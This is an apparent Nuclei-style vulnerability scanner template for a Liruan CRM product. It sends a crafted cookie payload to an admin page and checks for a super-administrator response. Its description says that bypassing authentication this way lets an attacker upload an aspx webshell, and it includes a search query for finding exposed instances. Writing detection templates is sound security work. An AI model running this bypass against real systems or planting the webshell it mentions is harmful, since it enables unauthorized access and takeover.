id: liruan-crm-cookie-unauth

info:
  name: liruan-crm-cookie-unauth
  author: unknow
  severity: high
  description: 上海力软信息技术有限公司 CRM 存在默认cookie权限绕过漏洞。有文件中心功能可直接上传aspx webshell.如果登录超时需要清下缓存
  tags: liruan,unauth
  metadata:
    fofa-qeury: body="/Home/AccordionIndex"
    veified: true
    max-request: 1

http:
  - raw:
      - |              
        GET /Home/AccordionIndex HTTP/1.1
        Host: 
        Cookie: {{unauth}}
        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15

    payloads:
      unauth:
        - ";"
               
    matchers:     
      - type: dsl
        name: unauth
        dsl:
          - "status_code_1 == 200 && contains(body,'learunui-framework.js') && contains(body,'超级管理员') && contains(header,'text/html')" 